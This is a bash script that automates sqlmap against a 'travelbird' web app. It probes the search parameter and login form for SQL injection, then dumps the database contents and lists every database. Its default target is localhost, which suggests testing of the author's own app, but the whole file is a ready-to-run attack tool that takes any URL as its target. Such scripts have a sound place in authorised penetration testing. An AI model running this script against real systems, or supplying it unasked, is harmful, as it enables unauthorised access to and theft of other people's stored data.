#!/bin/bash
# sqli_auto.sh - sqlmap wrapper for automated sql injection testing
# targets the travelbird search endpoint

TARGET="${1:-http://localhost:5000}"
OUTPUT_DIR="sqlmap_output"

echo "============================================"
echo "  sqli_auto.sh - sqlmap automation"
echo "============================================"
echo ""

# check if sqlmap is installed
if ! command -v sqlmap &> /dev/null; then
    echo "[!] sqlmap not found, trying python version..."
    if [ -f "/usr/share/sqlmap/sqlmap.py" ]; then
        SQLMAP="python3 /usr/share/sqlmap/sqlmap.py"
    else
        echo "[!] sqlmap not installed. install with: apt install sqlmap"
        exit 1
    fi
else
    SQLMAP="sqlmap"
fi

mkdir -p "$OUTPUT_DIR"

echo "[*] target: $TARGET"
echo "[*] output: $OUTPUT_DIR"
echo ""

# test the search parameter for injection
echo "[*] testing search endpoint for injection points..."
$SQLMAP -u "$TARGET/search?q=test" \
    --batch \
    --level=3 \
    --risk=2 \
    --output-dir="$OUTPUT_DIR" \
    --forms \
    --crawl=2 \
    2>&1 | tee "$OUTPUT_DIR/scan_log.txt"

echo ""
echo "[*] attempting to dump the database..."
$SQLMAP -u "$TARGET/search?q=test" \
    --batch \
    --dump \
    --output-dir="$OUTPUT_DIR" \
    2>&1 | tee -a "$OUTPUT_DIR/dump_log.txt"

echo ""
echo "[*] trying to identify all databases..."
$SQLMAP -u "$TARGET/search?q=test" \
    --batch \
    --dbs \
    --output-dir="$OUTPUT_DIR" \
    2>&1 | tee -a "$OUTPUT_DIR/dbs_log.txt"

# also test the login form
echo ""
echo "[*] testing login form..."
$SQLMAP -u "$TARGET/login" \
    --data="username=admin&password=admin" \
    --batch \
    --level=3 \
    --output-dir="$OUTPUT_DIR" \
    2>&1 | tee -a "$OUTPUT_DIR/login_log.txt"

echo ""
echo "============================================"
echo "  scan complete - check $OUTPUT_DIR/"
echo "============================================"
